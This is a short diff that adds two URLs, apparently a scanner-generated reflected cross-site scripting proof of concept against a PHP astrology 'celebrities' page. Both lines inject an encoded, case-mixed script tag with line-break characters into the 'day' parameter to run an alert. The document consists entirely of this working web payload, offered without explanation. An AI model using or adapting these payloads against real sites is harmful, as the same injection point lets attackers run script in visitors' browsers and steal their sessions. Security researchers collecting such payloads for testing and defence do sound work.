@@ -1,0 +1,3 @@
+http://www.example.com/demo/astrology/celebrities.php?month=01&amp;day=1&lt;ScRiPt %0A%0D&gt;alert(309147116220)%3B&lt;/ScRiPt&gt;
+http://www.example.com/celebrities.php?month=01&amp;day=1&lt;ScRiPt %0A%0D&gt;alert(309147116220)%3B&lt;/ScRiPt&gt;
+
